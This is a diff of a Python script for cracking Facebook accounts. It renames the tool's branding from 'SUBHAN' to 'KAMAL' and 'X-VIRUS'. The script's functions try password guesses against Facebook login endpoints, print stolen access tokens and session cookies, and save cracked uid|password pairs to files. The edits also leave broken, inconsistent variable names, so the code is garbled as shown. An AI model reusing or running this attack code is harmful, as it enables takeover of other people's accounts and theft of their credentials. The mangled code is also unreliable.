@@ -184,49 +184,23 @@ def menu():
 
 	logo()
 
-	
 
 	print("\n\033[1;93m[\033[1;94m01\033[1;97m] CRACK ID FROM PUBLIC FRIENDS")
 
-	print("\033[1;93m[\033[1;94m02\033[1;97m] CRACK ID FROM PUBLIC FOLLOWERS")
 
-	print("\033[1;93m[\033[1;94m03\033[1;97m] MULTIPLE-ID's CRACK\033[1;93m [ \033[1;95mPRO \033[1;97m]")
 
-	print("\033[1;93m[\033[1;94m04\033[1;97m] Chack Crack Results")
+	KamalVau= raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] CHOOSE : ")
 
-	print("\033[1;93m[\033[1;94m05\033[1;97m] USER-AGENT SETTINGS\033[1;97m [ \033[1;95mPRO \033[1;97m]")
-
-	print("\033[1;93m[\033[1;94m00\033[1;97m] Exit\033[1;97m [ \033[1;91mDELETE TOKEN \033[1;97m]")
-
-	Subhan = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] CHOOSE : ")
-
-	if Subhan =="":
+	if KamalVau=="":
 
 		menu()
 
-	elif Subhan == "1" or SUBHAN == "01":
+	elif Kamalvau== "1" or X-VIRUS == "01":
 
 		publik()
 
 		method()
 
-	elif Subhan == "2" or KHAN == "02":
-
-		follower()
-
-		method()
-
-	elif Subhan == "3" or  SUBHAN == "03":
-
-		massal()
-
-		method()
-
-	elif Umair == "4" or SUBHAN == "04":
-
-		print("\n\033[1;92m[\033[1;93m01\033[1;96m] CHECK CRACK RESULTS OK")
-
-		print("\033[1;93m[\033[1;94m02\033[1;96m] CHECK RESULTS CP")
 
 		cek = raw_input("\n\033[1;93m[\033[1;93m+\033[1;96m] CHOOSE : ")
 
@@ -432,7 +406,7 @@ def method():
 
 	print("\n\033[1;93m[\033[1;94m?\033[1;97m] CHOOSE CRACKING MATHORD")
 
-	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mSUBHAN PRO/FASTER \033[1;97m]")
+	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mKAMAL PRO/FASTER \033[1;97m]")
 
 	print("\033[1;93m[\033[1;94m2\033[1;97m] MBASIC\033[1;93m [ \033[1;95mFAST \033[1;97m]")
 
@@ -570,7 +544,7 @@ def bapi(user):
 
 			if "session_key" in send.text and "EAAA" in send.text:
 
-				print("\r\033[0;94m[SUBHAN-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+				print("\r\033[0;94m[X-VIRUS-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 
 				ok.append("%s|%s"%(uid, pw))
 
@@ -582,11 +556,11 @@ def bapi(user):
 
 			elif "www.facebook.com" in send.json()["error_msg"]:
 
-				print("\r\033[0;95m[SUBHAN-CP] %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[0;95m[X-VIRUS-CP] %s|%s\033[0;92m        "%(uid, pw))
 
 				cp.append("%s|%s"%(uid, pw))
 
-				open("CP/%s.txt"%(tSubhan),"a").write(" + %s|%s\n"%(uid, pw))
+				open("CP/%s.txt"%(KAMAL),"a").write(" + %s|%s\n"%(uid, pw))
 
 				break
 
@@ -670,11 +644,11 @@ def mbasic(user):
 
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 
-				print("\r\033[0;94m[SUBHAN-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
+				print("\r\033[0;94m[X-VIRUS-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
 
 				ok.append("%s|%s"%(uid, pw))
 
-				open("OK/%s.txt"%(tSubhan),"a").write(" + %s|%s\n"%(uid, pw))
+				open("OK/%s.txt"%(tkamal),"a").write(" + %s|%s\n"%(uid, pw))
 
 				break
 
@@ -682,7 +656,7 @@ def mbasic(user):
 
 			elif "checkpoint" in ses.cookies.get_dict().keys():
 
-				print("\r\033[0;95m[SUBHAN-CP] %s|%s\033[0;96m        "%(uid, pw))
+				print("\r\033[0;95m[X-VIRUS-CP] %s|%s\033[0;96m        "%(uid, pw))
 
 				cp.append("%s|%s"%(uid, pw))
 
